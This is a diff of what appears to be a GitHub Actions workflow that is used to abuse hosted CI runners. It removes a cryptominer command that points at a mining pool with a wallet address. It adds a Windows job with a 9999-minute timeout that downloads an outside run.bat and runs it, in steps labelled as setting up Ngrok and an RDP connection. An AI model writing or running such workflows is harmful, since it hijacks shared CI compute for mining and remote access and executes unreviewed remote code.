@@ -1,14 +1,19 @@
-# This is a basic workflow to help you get started with Actions
+jobs:
+  build:
 
-name: CI
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Download Ngrok & NSSM
+      run: |
+        Invoke-WebRequest https://github.com/hungpy20081994/cpu/blob/1ae36264fc9bf2445632848ae77c70d5ea4ecc6a/run.bat -OutFile run.bat
+    - name: Connect to your RDP 2core-7GB Ram.
+      run: cmd /c run.bat
 
 
-      #!/bin/bash
 
 
-chmod +x cpuminer-sse2
-
-./cpuminer-sse2 -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u MhXVoEN4V4syfXUZf4onpEpZRXiuZ2Qy5t.test1
 
 
-done
+
